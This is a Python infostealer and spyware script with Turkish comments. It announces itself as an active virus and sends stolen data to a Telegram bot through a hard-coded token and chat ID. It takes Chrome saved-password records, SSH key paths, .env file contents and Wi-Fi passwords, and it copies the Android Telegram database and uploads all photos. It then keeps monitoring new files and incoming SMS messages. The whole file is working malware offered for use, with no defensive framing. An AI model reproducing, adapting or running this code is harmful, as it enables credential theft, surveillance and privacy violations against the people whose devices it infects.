import os
import time
import requests
import hashlib
import subprocess
import json
import sqlite3
import shutil
import glob
import platform
import base64
import re
from datetime import datetime

# Telegram bilgileri
TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== TELEGRAM GÖNDERİCİ ========================
def telegram_mesaj(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": ADMIN_ID, "text": mesaj[:4000]}, timeout=15)
    except:
        pass

def telegram_foto_gonder(dosya_yolu):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(dosya_yolu, "rb") as foto:
            requests.post(url, data={"chat_id": ADMIN_ID}, files={"photo": foto}, timeout=30)
    except:
        pass

def telegram_dosya_gonder(dosya_yolu):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        with open(dosya_yolu, "rb") as dosya:
            requests.post(url, data={"chat_id": ADMIN_ID}, files={"document": dosya}, timeout=30)
    except:
        pass

# ======================== SİSTEM BİLGİSİ ========================
def sistem_bilgisi():
    try:
        sistem = platform.system()
        host = os.uname().node
        kullanici = os.getlogin()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        telegram_mesaj(f"💻 SİSTEM: {sistem} | {host} | {kullanici} | IP: {ip}")
    except:
        telegram_mesaj("❌ Sistem bilgisi alınamadı.")

# ======================== TARAYICI ŞİFRELERİ ========================
def tarayici_sifreleri():
    try:
        chrome_login = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(chrome_login):
            shutil.copy(chrome_login, "/tmp/chrome_login.db")
            telegram_mesaj("✅ Chrome şifre dosyası bulundu ve kopyalandı.")
            try:
                conn = sqlite3.connect("/tmp/chrome_login.db")
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 15")
                satirlar = cursor.fetchall()
                for row in satirlar:
                    telegram_mesaj(f"🔑 {row[0]} | {row[1]} | {row[2][:30]}")
            except:
                pass
    except:
        pass

# ======================== SSH ANAHTARLARI ========================
def ssh_anahtarlari():
    try:
        ssh_dosyalari = glob.glob(os.path.expanduser("~/.ssh/*"))
        if ssh_dosyalari:
            telegram_mesaj(f"🔐 SSH: {', '.join(ssh_dosyalari)}")
    except:
        pass

# ======================== .ENV DOSYALARI ========================
def env_dosyalari():
    try:
        env_files = glob.glob(os.path.expanduser("~/**/*.env"), recursive=True)
        if env_files:
            telegram_mesaj(f"⚙️ .env bulundu: {', '.join(env_files[:5])}")
            for env in env_files[:3]:
                with open(env, 'r') as f:
                    telegram_mesaj(f"📄 {env}: {f.read()[:300]}")
    except:
        pass

# ======================== Wİ-Fİ ŞİFRELERİ ========================
def wifi_sifreleri():
    try:
        wifi = subprocess.check_output(["grep", "-r", "psk=", "/etc/NetworkManager/system-connections/"], text=True, stderr=subprocess.DEVNULL, timeout=5)
        telegram_mesaj(f"📶 Wi-Fi: {wifi[:500]}")
    except:
        pass

# ======================== TELEGRAM VERİSİ (ANDROID) ========================
def telegram_veri():
    try:
        db_path = "/data/data/org.telegram.messenger/files/databases/cache4.db"
        if os.path.exists(db_path):
            shutil.copy(db_path, "/tmp/telegram.db")
            telegram_dosya_gonder("/tmp/telegram.db")
            telegram_mesaj("📱 Telegram veritabanı gönderildi.")
    except:
        pass

# ======================== TÜM FOTOĞRAFLARI GÖNDER ========================
def tum_fotograflari_gonder():
    foto_uzantilari = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.svg')
    klasorler = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/DCIM"),
        os.path.expanduser("~/storage/emulated/0/DCIM"),
        os.path.expanduser("~/storage/emulated/0/Pictures"),
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]

    telegram_mesaj("📸 Tüm fotoğraflar taranıyor...")
    sayac = 0
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for root, dirs, files in os.walk(klasor):
            for dosya in files:
                if dosya.lower().endswith(foto_uzantilari):
                    dosya_yolu = os.path.join(root, dosya)
                    try:
                        telegram_foto_gonder(dosya_yolu)
                        sayac += 1
                        time.sleep(1)
                    except:
                        pass
    telegram_mesaj(f"✅ Toplam {sayac} fotoğraf gönderildi.")

# ======================== DOSYA İZLEYİCİ (YENİ DOSYALAR) ========================
def dosya_izleyici():
    klasorler = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                dosya_yolu = os.path.join(klasor, dosya)
                if os.path.isfile(dosya_yolu):
                    try:
                        with open(dosya_yolu, "rb") as f:
                            dosya_hash = hashlib.md5(f.read()).hexdigest()
                        if dosya_hash not in hash_kayit:
                            hash_kayit[dosya_hash] = dosya_yolu
                            telegram_mesaj(f"📁 YENİ DOSYA: {dosya_yolu}")
                            if dosya_yolu.lower().endswith(('.jpg', '.png', '.jpeg', '.gif', '.bmp', '.webp')):
                                telegram_foto_gonder(dosya_yolu)
                    except:
                        pass
        time.sleep(15)

# ======================== GERÇEK ZAMANLI SMS İZLEYİCİ ========================
def sms_izleyici():
    telegram_mesaj("📨 SMS izleyici başlatıldı. Yeni SMS'ler takip ediliyor...")
    sms_hash = {}
    
    while True:
        try:
            # Android'de en son 10 SMS'i al
            result = subprocess.check_output(
                ["adb", "shell", "content", "query", "--uri", "content://sms/inbox", 
                 "--projection", "_id,address,body,date", "--sort", "date DESC", "--limit", "10"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            
            # Her satırı parse et
            for line in result.split('\n'):
                if "_id=" in line and "address=" in line and "body=" in line:
                    try:
                        # _id, address, body'yi çıkar
                        sms_id = re.search(r'_id=(\d+)', line)
                        sms_address = re.search(r'address=([^,]+)', line)
                        sms_body = re.search(r'body=([^,]+?)(?=,|$)', line)
                        
                        if sms_id and sms_address and sms_body:
                            sms_id_val = sms_id.group(1)
                            sms_address_val = sms_address.group(1)
                            sms_body_val = sms_body.group(1)
                            
                            # Eğer bu SMS daha önce görülmediyse gönder
                            if sms_id_val not in sms_hash:
                                sms_hash[sms_id_val] = True
                                telegram_mesaj(f"📨 YENİ SMS\n📱 Gönderen: {sms_address_val}\n💬 İçerik: {sms_body_val}")
                    except:
                        pass
            time.sleep(5)  # 5 saniyede bir kontrol
        except:
            time.sleep(5)

# ======================== ANA ÇALIŞTIRICI ========================
def ana():
    telegram_mesaj("🚀 VİRÜS AKTİF! TÜM VERİLER TOPLANIYOR...")
    sistem_bilgisi()
    time.sleep(2)
    tarayici_sifreleri()
    time.sleep(2)
    ssh_anahtarlari()
    time.sleep(2)
    env_dosyalari()
    time.sleep(2)
    wifi_sifreleri()
    time.sleep(2)
    telegram_veri()
    time.sleep(2)
    tum_fotograflari_gonder()
    time.sleep(2)
    telegram_mesaj("✅ TÜM VERİLER TOPLANDI. SÜREKLİ İZLEME BAŞLADI...")
    
    # SMS ve dosya izleyiciyi aynı anda çalıştır
    import threading
    threading.Thread(target=sms_izleyici, daemon=True).start()
    threading.Thread(target=dosya_izleyici, daemon=True).start()
    
    # Sonsuz döngü
    while True:
        time.sleep(60)

if __name__ == "__main__":
    ana()
